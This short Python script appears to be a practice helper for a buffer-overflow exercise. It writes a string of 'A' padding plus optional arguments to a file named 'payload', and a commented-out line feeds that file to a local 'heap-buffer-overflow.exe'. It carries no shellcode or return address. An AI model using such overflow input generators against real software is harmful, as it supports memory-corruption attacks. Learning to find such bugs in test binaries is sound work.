"""
Usage for exploit :
    exploitcore <length> <additionnal arguments (strings)>...
    stack-buffer-overflow < payload
"""

import sys
import os
target_executable = "heap-buffer-overflow.exe"
payload = "FF"
length = 70

if len(sys.argv) > 1:
    length = int(sys.argv[1])
    
#if len(sys.argv) > 2:
#    payload = sys.argv[2]
toprint = "A"*length
i = 1
while i < len(sys.argv)-1:
    i += 1
    toprint += sys.argv[i]

print(toprint)

file = open("payload", "w")

file.write(toprint)

#os.system(target_executable + "< " + "payload")